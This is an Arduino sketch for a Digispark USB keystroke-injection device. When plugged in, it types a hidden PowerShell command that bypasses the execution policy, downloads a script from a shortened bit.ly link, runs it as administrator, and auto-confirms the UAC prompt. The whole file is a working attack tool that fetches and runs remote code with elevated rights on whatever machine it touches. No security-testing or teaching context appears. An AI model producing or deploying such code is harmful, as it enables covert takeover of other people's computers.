#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup()
{
  pinMode(1, OUTPUT);
}

void loop()
{
  // Starting a hidden administrator instance of powershell to run the entire script.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell -w hidden Set-ExecutionPolicy Bypass -Scope Process -Force; Set-Location (gi $env:temp).fullname; Invoke-WebRequest -URI 'https://bit.ly/TinyPicoInstaller' -OutFile 'installer.ps1'; & '.\\installer.ps1'");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);

  // Pausing the program to prevent re-run.
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(900000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
